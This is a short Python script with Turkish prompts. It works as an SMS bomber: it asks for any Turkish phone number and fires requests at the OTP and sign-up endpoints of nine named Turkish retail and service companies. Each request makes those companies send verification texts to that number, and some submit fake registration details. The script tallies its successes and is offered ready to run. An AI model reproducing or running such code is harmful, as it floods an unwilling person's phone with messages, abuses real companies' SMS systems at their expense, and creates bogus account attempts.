import requests
import time

session = requests.Session()

phone = input("Numarayı gir (10 hane, 555xxxxxxx): ").strip()

if len(phone) != 10 or not phone.isdigit():
    print("Hatalı format knk!")
    exit()

print(f"\n{phone} numarasına sadece KESİN ÇALIŞAN 9 siteden OTP gönderiliyor...\n")
time.sleep(2)

basarili = 0
toplam = 9

def try_send(name, url, headers={}, json=None, data=None):
    global basarili
    try:
        if data:
            r = session.post(url, headers=headers, data=data, timeout=10)
        else:
            r = session.post(url, headers=headers, json=json, timeout=10)
        
        if r.status_code in [200, 201, 202, 204]:
            print(f"[+] {name}")
            basarili += 1
        else:
            print(f"[-] {name}")
    except:
        print(f"[!] {name}")
    time.sleep(2.5)

# KESİN ÇALIŞAN 9 SITE
try_send("Kahve Dünyası", "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
         headers={"Content-Type": "application/json"},
         json={"countryCode": "90", "phoneNumber": phone})

try_send("Bim", "https://bim.veesk.net/service/v1.0/account/login",
         json={"phone": phone})

try_send("English Home", "https://www.englishhome.com/api/member/sendOtp",
         headers={"Content-Type": "application/json"},
         json={"Phone": phone, "XID": ""})

try_send("Suiste", "https://suiste.com/api/auth/code",
         headers={"Content-Type": "application/x-www-form-urlencoded"},
         data={"action": "register", "device_id": "random", "full_name": "Test", "gsm": phone, "is_advertisement": "1", "is_contract": "1", "password": "Test1234"})

try_send("Hayatsu", "https://api.hayatsu.com.tr/api/SignUp/SendOtp",
         headers={"Content-Type": "application/x-www-form-urlencoded"},
         data={"mobilePhoneNumber": phone, "actionType": "register"})

try_send("Metro", "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
         json={"methodType": "2", "mobilePhoneNumber": phone})

try_send("File Market", "https://api.filemarket.com.tr/v1/otp/send",
         headers={"Content-Type": "application/json"},
         json={"mobilePhoneNumber": f"90{phone}"})

try_send("Porty", "https://panel.porty.tech/api.php",
         headers={"Content-Type": "application/json"},
         json={"job": "start_login", "phone": phone})

try_send("Yapp", "https://yapp.com.tr/api/mobile/v1/register",
         headers={"Content-Type": "application/json"},
         json={"phone_number": phone, "firstname": "Test", "lastname": "User", "email": "test@test.com", "app_version": "1.1.5", "code": "tr", "is_allow_to_communication": "1", "language_id": "2", "sms_code": ""})

print(f"\nBitti knk!")
print(f"9 siteden {basarili} tane başarılı oldu.")
print("Kendi numaranla dene, spam klasörünü de kontrol et 😎")